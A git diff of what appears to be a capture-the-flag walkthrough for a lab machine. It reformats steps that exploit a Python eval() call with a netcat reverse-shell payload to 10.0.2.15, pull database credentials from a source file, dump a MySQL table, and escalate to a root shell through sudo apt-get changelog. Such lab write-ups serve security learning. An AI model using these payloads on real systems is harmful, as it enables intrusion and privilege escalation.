@@ -47,16 +47,20 @@ with open('/home/alienum/Desktop/emails.txt') as users:
 scan the qrcode and insert the otp code
 
 ## Exploit eval() python function 
-
+```console
 __import__('os').system('nc -e /bin/sh 10.0.2.15 4444')
-
-## MySQL enumeration
+```
+## MySQL enumeration find banker credentials
+```console
 cat /var/www/html/main.py
 banker:neobank1
 mysql -u banker -pneobank1
 use bank;
 select * from system;
-banker:adv1se.me
+banker:a********
+```
 ## GTFObins
+```console
 sudo apt-get changelog apt
 !/bin/sh
+```
